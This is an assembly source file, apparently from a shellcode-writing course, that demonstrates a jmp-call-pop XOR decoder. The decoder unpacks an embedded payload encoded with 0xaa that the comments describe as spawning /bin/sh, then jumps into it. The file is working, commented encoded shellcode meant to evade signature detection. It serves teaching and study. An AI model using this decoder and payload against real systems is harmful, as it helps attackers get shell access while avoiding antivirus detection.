; Filename: xor-decoder.nasm
; Author:  Michael Norris
; Purpose: Demonstrate basic XOR encoder

global _start    

section .text
_start:
    ;  1.) jumps to the 'call_decoder' label
    jmp short call_decoder 

decoder:
    ; 3.) pops encoded 'shellcode' into esi 
    pop esi 

decode:
    ; xors the byte at [esi] with 0xaa to start decoding
    xor byte [esi], 0xaa
    ; 4.) jumps to shellcode when zero flag is set (this will happen on an xor 0xaa, 0xaa)
    jz shellcode
    ; if jz doesn't happen, increase esi by one so next byte is xor decoded
    inc esi 
    ; jumps to start of 'decode' label to restart decoding process
    jmp short decode

call_decoder:
    ; 2.) calls 'decoder' label, and pushes 'shellcode' to stack as a result
    call decoder
    ; xor-encoded shellcode (using 0xaa) from xor-encoder.nasm objdump 'push-string-stack //bin/sh'
    shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa
